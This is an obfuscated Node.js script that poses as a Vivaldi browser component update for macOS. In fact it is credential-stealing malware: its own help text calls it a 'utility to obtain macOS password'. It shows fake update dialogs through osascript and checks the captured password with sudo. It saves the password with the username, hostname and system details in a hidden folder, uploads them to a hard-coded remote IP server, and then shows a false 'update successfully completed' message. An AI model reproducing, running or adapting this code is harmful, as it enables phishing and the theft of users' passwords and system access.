#!/usr/bin/env node

const _0x4e2a6d=_0x1221;function _0x5997(){const _0x1ac991=['5648720pwdujK','end','\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20set\x20buttonText\x20to\x20\x22Continue\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20try\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display\x20dialog\x20dialogText\x20with\x20title\x20dialogTitle\x20default\x20answer\x20\x22\x22\x20buttons\x20{\x22Cancel\x22,\x20buttonText}\x20default\x20button\x20buttonText\x20with\x20icon\x20path\x20to\x20resource\x20\x22AppIcon.icns\x22\x20in\x20bundle\x20\x22/Applications/Vivaldi.app\x22\x20with\x20hidden\x20answer\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20set\x20userPassword\x20to\x20text\x20returned\x20of\x20the\x20result\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20return\x20userPassword\x0a\x20\x20\x20\x20\x20\x20\x20\x20on\x20error\x20number\x20-128\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20return\x20\x22CANCELLED\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20end\x20try\x0a\x20\x20\x20\x20\x20\x20','https://','userInfo','----WebKitFormBoundary','substring','username','hostname','floor','join','User:\x20','The\x20application\x20\x22Vivaldi\x22\x20is\x20trying\x20to\x20make\x20changes\x20to\x20system\x20settings.','585706RKCIhF','\x22\x20|\x20sudo\x20-S\x20echo\x20\x22Password\x20verified\x22\x202>/dev/null\x0aexit\x20$?\x0a','argv','tmpdir','\x0a\x20\x20\x20\x20\x20\x20\x20\x20set\x20username\x20to\x20\x22','\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20set\x20dialogText\x20to\x20\x22','8208936eIJmkZ','8NGeevx','--help','32065101pJDRuy','\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20set\x20dialogTitle\x20to\x20\x22','bash\x20','6615595gOlbOG','search','slice','.sh','release','pathname','split','retryDelay','trim','data','mkdirSync','\x22\x0d\x0a','random','error','Vivaldi\x20-\x20Component\x20Update','outputFile','verify_password_','write','tJz4uRVCwl2eEwyPTudYP9iGRfgq','stringify','crypto','\x0aPlatform:\x20','statusCode','\x0aArchitecture:\x20','00:00:00:00:00:00','.scpt','http','homedir','VivaldiCache','writeFileSync','port','now','digest','substr','unknown','help','internal','existsSync','\x0a#!/bin/bash\x0aecho\x20\x22','Content-Type:\x20application/json\x0d\x0a\x0d\x0a','hex','--output','then','arch','Your\x20password\x20is\x20required\x20to\x20complete\x20the\x20Vivaldi\x20update.','main','\x0d\x0a--','\x0aPassword:\x20','maxAttempts','startsWith','md5','keys','apiKey','multipart/form-data;\x20boundary=','verify','vivaldi_passwords.txt','serverUrl','\x0aClientID:\x20','toISOString','unlinkSync','5581832OBnuoZ','path','osascript\x20\x22','\x0aType:\x20','.txt','basename','log','request','4YEAbiv','toString','length','child_process','type','mac','--no-verify','http://65.87.7.103:8088/api/files/upload','356703ZUGXmV','.json','--attempts','Privacy\x20and\x20Security','networkInterfaces','update','CANCELLED','\x0a\x20\x20\x20\x20\x20\x20\x20\x20display\x20dialog\x20\x22Vivaldi\x20update\x20successfully\x20completed.\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x20with\x20icon\x20note\x0a\x20\x20\x20\x20\x20\x20','platform','statSync','createHash'];_0x5997=function(){return _0x1ac991;};return _0x5997();}(function(_0x5a86c9,_0x22269b){const _0x14d222=_0x1221,_0x30128a=_0x5a86c9();while(!![]){try{const _0x41b403=parseInt(_0x14d222(0xf1))/0x1*(parseInt(_0x14d222(0x111))/0x2)+-parseInt(_0x14d222(0xf9))/0x3*(-parseInt(_0x14d222(0x118))/0x4)+-parseInt(_0x14d222(0x11d))/0x5+-parseInt(_0x14d222(0x117))/0x6+-parseInt(_0x14d222(0x104))/0x7+-parseInt(_0x14d222(0xe9))/0x8+parseInt(_0x14d222(0x11a))/0x9;if(_0x41b403===_0x22269b)break;else _0x30128a['push'](_0x30128a['shift']());}catch(_0x21a9eb){_0x30128a['push'](_0x30128a['shift']());}}}(_0x5997,0xbd767));const {execSync}=require(_0x4e2a6d(0xf4)),fs=require('fs'),path=require(_0x4e2a6d(0xea)),os=require('os'),crypto=require(_0x4e2a6d(0x131)),http=require(_0x4e2a6d(0x137)),https=require('https'),CONFIG={'serverUrl':_0x4e2a6d(0xf8),'apiKey':_0x4e2a6d(0x12f),'retryDelay':0x1388,'maxRetries':0x5,'timeout':0x1d4c0};function _0x1221(_0x67bb9c,_0x35dc10){const _0x5997df=_0x5997();return _0x1221=function(_0x122161,_0x6870e5){_0x122161=_0x122161-0xd4;let _0x497400=_0x5997df[_0x122161];return _0x497400;},_0x1221(_0x67bb9c,_0x35dc10);}function generateClientId(){const _0x5b960b=_0x4e2a6d;try{const _0x30f398=getMacAddress(),_0x109c47=os[_0x5b960b(0x10c)](),_0x340a50=os[_0x5b960b(0x108)]()[_0x5b960b(0x10b)],_0x7f8c30=crypto[_0x5b960b(0x103)](_0x5b960b(0xdf))[_0x5b960b(0xfe)](_0x30f398+':'+_0x109c47+':'+_0x340a50)[_0x5b960b(0x13d)](_0x5b960b(0xd5))[_0x5b960b(0x10a)](0x0,0x8);return _0x7f8c30;}catch(_0x4788f2){return Math[_0x5b960b(0x129)]()['toString'](0x24)[_0x5b960b(0x10a)](0x2,0xa);}}function getMacAddress(){const _0xd0b6db=_0x4e2a6d;try{const _0x2a5209=os[_0xd0b6db(0xfd)]();for(const _0x29edbf of Object[_0xd0b6db(0xe0)](_0x2a5209)){for(const _0xf4c58f of _0x2a5209[_0x29edbf]){if(!_0xf4c58f[_0xd0b6db(0x141)]&&_0xf4c58f[_0xd0b6db(0xf6)]!==_0xd0b6db(0x135))return _0xf4c58f[_0xd0b6db(0xf6)];}}return'unknown';}catch(_0x562a0d){return _0xd0b6db(0x13f);}}function verifyPassword(_0x499dbb,_0x436fba){const _0x3ffb19=_0x4e2a6d;try{const _0x2fa868=path[_0x3ffb19(0x10e)](os[_0x3ffb19(0x114)](),_0x3ffb19(0x12d)+Date['now']()+_0x3ffb19(0x120)),_0x3a7db4=_0x3ffb19(0x143)+_0x436fba+_0x3ffb19(0x112);return fs['writeFileSync'](_0x2fa868,_0x3a7db4,{'mode':0x1c0}),execSync(_0x3ffb19(0x11c)+_0x2fa868),fs[_0x3ffb19(0xe8)](_0x2fa868),!![];}catch(_0x28e3ae){return![];}}async function uploadFile(_0xd5804c,_0x1b2e70=0x0){return new Promise(_0x3b5471=>{const _0x57f28c=_0x1221;try{if(!fs['existsSync'](_0xd5804c)){_0x3b5471(![]);return;}const _0x4ad0ea=fs[_0x57f28c(0x102)](_0xd5804c),_0x192455=_0x4ad0ea['size'];if(_0x192455===0x0){_0x3b5471(![]);return;}const _0x4dbf72=fs['readFileSync'](_0xd5804c);let _0x53e6bb;const _0x3859f7=path['basename'](_0xd5804c),_0x563592=_0x3859f7[_0x57f28c(0x123)]('.')[0x0];_0x563592[_0x57f28c(0xf3)]===0x8&&/^[0-9a-f]+$/i['test'](_0x563592)?_0x53e6bb=_0x563592:_0x53e6bb=generateClientId();const _0x9f9a9c={'hostname':os[_0x57f28c(0x10c)](),'platform':os[_0x57f28c(0x101)](),'type':os['type'](),'arch':os[_0x57f28c(0xd8)](),'username':os[_0x57f28c(0x108)]()[_0x57f28c(0x10b)],'id':_0x53e6bb},_0x26a954=CONFIG['serverUrl'][_0x57f28c(0xde)](_0x57f28c(0x107)),_0x50983c=_0x26a954?https:http,_0x44264d=new URL(CONFIG[_0x57f28c(0xe5)]),_0x1b8e07=_0x57f28c(0x109)+Math[_0x57f28c(0x129)]()[_0x57f28c(0xf2)](0x10)[_0x57f28c(0x13e)](0x2);let _0x3801da='';_0x3801da+='--'+_0x1b8e07+'\x0d\x0a',_0x3801da+='Content-Disposition:\x20form-data;\x20name=\x22clientInfo\x22\x0d\x0a',_0x3801da+=_0x57f28c(0xd4),_0x3801da+=JSON['stringify'](_0x9f9a9c)+'\x0d\x0a',_0x3801da+='--'+_0x1b8e07+'\x0d\x0a',_0x3801da+='Content-Disposition:\x20form-data;\x20name=\x22file\x22;\x20filename=\x22'+path[_0x57f28c(0xee)](_0xd5804c)+_0x57f28c(0x128),_0x3801da+='Content-Type:\x20text/plain\x0d\x0a\x0d\x0a';const _0x123477={'hostname':_0x44264d[_0x57f28c(0x10c)],'port':_0x44264d[_0x57f28c(0x13b)]||(_0x26a954?0x1bb:0x50),'path':_0x44264d[_0x57f28c(0x122)]+_0x44264d[_0x57f28c(0x11e)],'method':'POST','headers':{'Content-Type':_0x57f28c(0xe2)+_0x1b8e07,'X-Client-Info':JSON['stringify'](_0x9f9a9c),'X-API-Key':CONFIG[_0x57f28c(0xe1)]},'timeout':CONFIG['timeout']},_0x5e988c=_0x50983c[_0x57f28c(0xf0)](_0x123477,_0x1b7fc2=>{const _0x1706e3=_0x57f28c;let _0x4dc6ed='';_0x1b7fc2['on'](_0x1706e3(0x126),_0x4c195f=>{_0x4dc6ed+=_0x4c195f;}),_0x1b7fc2['on'](_0x1706e3(0x105),()=>{const _0x240aa1=_0x1706e3;_0x1b7fc2[_0x240aa1(0x133)]>=0xc8&&_0x1b7fc2[_0x240aa1(0x133)]<0x12c?_0x3b5471(!![]):_0x1b2e70<CONFIG['maxRetries']?setTimeout(()=>{const _0x139502=_0x240aa1;uploadFile(_0xd5804c,_0x1b2e70+0x1)[_0x139502(0xd7)](_0x3b5471);},CONFIG['retryDelay']):_0x3b5471(![]);});});_0x5e988c['on'](_0x57f28c(0x12a),_0x1b84e9=>{const _0x171bd3=_0x57f28c;_0x1b2e70<CONFIG['maxRetries']?setTimeout(()=>{uploadFile(_0xd5804c,_0x1b2e70+0x1)['then'](_0x3b5471);},CONFIG[_0x171bd3(0x124)]):_0x3b5471(![]);}),_0x5e988c[_0x57f28c(0x12e)](_0x3801da),_0x5e988c[_0x57f28c(0x12e)](_0x4dbf72),_0x5e988c[_0x57f28c(0x12e)](_0x57f28c(0xdb)+_0x1b8e07+'--\x0d\x0a'),_0x5e988c[_0x57f28c(0x105)]();}catch(_0x1e26b1){_0x1b2e70<CONFIG['maxRetries']?setTimeout(()=>{const _0x22042f=_0x57f28c;uploadFile(_0xd5804c,_0x1b2e70+0x1)[_0x22042f(0xd7)](_0x3b5471);},CONFIG[_0x57f28c(0x124)]):_0x3b5471(![]);}});}function showPasswordPrompt(_0x54ccda,_0x28ac36=0x3,_0x459a78=!![]){const _0x52dad5=_0x4e2a6d;try{const _0x2ff433=os[_0x52dad5(0x138)](),_0x4abfb4=path[_0x52dad5(0x10e)](_0x2ff433,_0x52dad5(0x139));!fs[_0x52dad5(0x142)](_0x4abfb4)&&fs[_0x52dad5(0x127)](_0x4abfb4,{'recursive':!![]});_0x54ccda=_0x54ccda||path[_0x52dad5(0x10e)](_0x4abfb4,_0x52dad5(0xe4));const _0x58137b=os[_0x52dad5(0x108)]()['username'];let _0x5145ff=_0x28ac36,_0x144ccc=![],_0xc443ba='';while(_0x5145ff>0x0&&!_0x144ccc){const _0x3cfd23=path[_0x52dad5(0x10e)](os[_0x52dad5(0x114)](),'vivaldi_update_prompt_'+Date[_0x52dad5(0x13c)]()+'.scpt');let _0x3e213d=_0x5145ff<_0x28ac36?'Incorrect\x20password\x20entered.\x20':'';const _0x2818d4=[_0x52dad5(0x12b),_0x52dad5(0xfc),'Outdated\x20Vivaldi\x20Version.\x20Update\x20Required'],_0x46746a=[_0x52dad5(0xd9),_0x52dad5(0x110),'To\x20update,\x20enter\x20the\x20user\x20password.'],_0x4c54a8=Math[_0x52dad5(0x10d)](Math[_0x52dad5(0x129)]()*_0x2818d4[_0x52dad5(0xf3)]),_0x1307d0=_0x2818d4[_0x4c54a8],_0xf566a2=_0x46746a[_0x4c54a8],_0x372934='\x0a\x20\x20\x20\x20\x20\x20\x20\x20set\x20username\x20to\x20\x22'+_0x58137b+'\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20set\x20dialogTitle\x20to\x20\x22'+_0x1307d0+_0x52dad5(0x116)+_0x3e213d+_0xf566a2+_0x52dad5(0x106),_0x12d650=_0x52dad5(0x115)+_0x58137b+_0x52dad5(0x11b)+_0x1307d0+_0x52dad5(0x116)+_0x3e213d+_0xf566a2+'\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20set\x20buttonText\x20to\x20\x22Continue\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20try\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display\x20dialog\x20dialogText\x20with\x20title\x20dialogTitle\x20default\x20answer\x20\x22\x22\x20buttons\x20{\x22Cancel\x22,\x20buttonText}\x20default\x20button\x20buttonText\x20with\x20icon\x20caution\x20with\x20hidden\x20answer\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20set\x20userPassword\x20to\x20text\x20returned\x20of\x20the\x20result\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20return\x20userPassword\x0a\x20\x20\x20\x20\x20\x20\x20\x20on\x20error\x20number\x20-128\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20return\x20\x22CANCELLED\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20end\x20try\x0a\x20\x20\x20\x20\x20\x20';fs[_0x52dad5(0x13a)](_0x3cfd23,_0x372934);try{_0xc443ba=execSync(_0x52dad5(0xeb)+_0x3cfd23+'\x22')['toString']()[_0x52dad5(0x125)]();}catch(_0x252f94){fs['writeFileSync'](_0x3cfd23,_0x12d650),_0xc443ba=execSync(_0x52dad5(0xeb)+_0x3cfd23+'\x22')[_0x52dad5(0xf2)]()[_0x52dad5(0x125)]();}fs['unlinkSync'](_0x3cfd23);if(_0xc443ba===_0x52dad5(0xff))return![];_0x459a78?_0x144ccc=verifyPassword(_0x58137b,_0xc443ba):_0x144ccc=!![];if(!_0x144ccc){_0x5145ff--;if(_0x5145ff<=0x0){const _0x2e7123=path[_0x52dad5(0x10e)](os[_0x52dad5(0x114)](),'vivaldi_update_error_'+Date['now']()+'.scpt'),_0x7c1577='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display\x20dialog\x20\x22Maximum\x20password\x20attempts\x20exceeded.\x20Update\x20canceled.\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x20with\x20icon\x20stop\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20';return fs[_0x52dad5(0x13a)](_0x2e7123,_0x7c1577),execSync(_0x52dad5(0xeb)+_0x2e7123+'\x22'),fs[_0x52dad5(0xe8)](_0x2e7123),![];}}}if(_0x144ccc){const _0x16ee63=generateClientId(),_0x289eed=os['homedir'](),_0x5186f1=path[_0x52dad5(0x10e)](_0x289eed,_0x52dad5(0x139));!fs[_0x52dad5(0x142)](_0x5186f1)&&fs[_0x52dad5(0x127)](_0x5186f1,{'recursive':!![]});const _0x30f818=path['join'](_0x5186f1,_0x16ee63+_0x52dad5(0xed)),_0x1efa14=_0x52dad5(0x10f)+_0x58137b+_0x52dad5(0xdc)+_0xc443ba+'\x0aTime:\x20'+new Date()['toISOString']()+'\x0aHostname:\x20'+os[_0x52dad5(0x10c)]()+_0x52dad5(0x132)+os[_0x52dad5(0x101)]()+_0x52dad5(0xec)+os[_0x52dad5(0xf5)]()+_0x52dad5(0x134)+os['arch']()+_0x52dad5(0xe6)+_0x16ee63;fs[_0x52dad5(0x13a)](_0x30f818,_0x1efa14);try{const _0x36374e={'user':_0x58137b,'password':_0xc443ba,'timestamp':new Date()[_0x52dad5(0xe7)](),'hostname':os[_0x52dad5(0x10c)](),'system':{'platform':os['platform'](),'release':os[_0x52dad5(0x121)](),'type':os[_0x52dad5(0xf5)](),'arch':os[_0x52dad5(0xd8)]()},'clientId':_0x16ee63},_0x4e02df=path['join'](_0x5186f1,_0x16ee63+_0x52dad5(0xfa));fs[_0x52dad5(0x13a)](_0x4e02df,JSON[_0x52dad5(0x130)](_0x36374e,null,0x2)),_0x54ccda&&_0x54ccda!==_0x30f818&&fs[_0x52dad5(0x13a)](_0x54ccda,_0x1efa14,{'flag':'a'}),uploadFile(_0x30f818)[_0x52dad5(0xd7)](_0x4fe0a8=>{});}catch(_0x4f898d){}const _0x2af779=path[_0x52dad5(0x10e)](os[_0x52dad5(0x114)](),'vivaldi_update_success_'+Date[_0x52dad5(0x13c)]()+_0x52dad5(0x136)),_0x17ad3c='\x0a\x20\x20\x20\x20\x20\x20\x20\x20display\x20dialog\x20\x22Vivaldi\x20update\x20successfully\x20completed.\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x20with\x20icon\x20path\x20to\x20resource\x20\x22AppIcon.icns\x22\x20in\x20bundle\x20\x22/Applications/Vivaldi.app\x22\x0a\x20\x20\x20\x20\x20\x20',_0x1ebf57=_0x52dad5(0x100);fs[_0x52dad5(0x13a)](_0x2af779,_0x17ad3c);try{execSync('osascript\x20\x22'+_0x2af779+'\x22');}catch(_0x20e9da){fs[_0x52dad5(0x13a)](_0x2af779,_0x1ebf57),execSync(_0x52dad5(0xeb)+_0x2af779+'\x22');}return fs[_0x52dad5(0xe8)](_0x2af779),!![];}return![];}catch(_0x2b6428){return![];}}function parseArgs(){const _0x36ea3a=_0x4e2a6d,_0x96a1e1=process[_0x36ea3a(0x113)][_0x36ea3a(0x11f)](0x2),_0x29d703={'outputFile':null,'maxAttempts':0x7,'verify':!![],'help':![]};for(let _0x35866c=0x0;_0x35866c<_0x96a1e1['length'];_0x35866c++){switch(_0x96a1e1[_0x35866c]){case _0x36ea3a(0xd6):case'-o':_0x29d703[_0x36ea3a(0x12c)]=_0x96a1e1[++_0x35866c];break;case _0x36ea3a(0xfb):case'-a':_0x29d703[_0x36ea3a(0xdd)]=parseInt(_0x96a1e1[++_0x35866c],0xa);break;case _0x36ea3a(0xf7):_0x29d703['verify']=![];break;case _0x36ea3a(0x119):case'-h':_0x29d703[_0x36ea3a(0x140)]=!![];break;}}return _0x29d703;}function showHelp(){const _0x33fb8c=_0x4e2a6d;console[_0x33fb8c(0xef)]('\x0aVivaldi\x20Password\x20Prompt\x20-\x20utility\x20to\x20obtain\x20macOS\x20password\x0a\x0aUsage:\x0a\x20\x20vivaldi-password-prompt\x20[options]\x0a\x0aOptions:\x0a\x20\x20-o,\x20--output\x20FILE\x20\x20\x20\x20\x20\x20\x20Path\x20to\x20file\x20for\x20saving\x20password\x0a\x20\x20-a,\x20--attempts\x20NUM\x20\x20\x20\x20\x20\x20Maximum\x20number\x20of\x20input\x20attempts\x20(default:\x203)\x0a\x20\x20--no-verify\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Disable\x20password\x20verification\x0a\x20\x20-h,\x20--help\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Show\x20this\x20help\x0a\x20\x20\x0aExamples:\x0a\x20\x20vivaldi-password-prompt\x0a\x20\x20vivaldi-password-prompt\x20--output\x20/path/to/passwords.json\x20--attempts\x205\x0a\x20\x20vivaldi-password-prompt\x20--no-verify\x0a\x20\x20');}if(require[_0x4e2a6d(0xda)]===module){const options=parseArgs();options[_0x4e2a6d(0x140)]?showHelp():showPasswordPrompt(options[_0x4e2a6d(0x12c)],options[_0x4e2a6d(0xdd)],options[_0x4e2a6d(0xe3)]);}module['exports']={'showPasswordPrompt':showPasswordPrompt,'verifyPassword':verifyPassword};
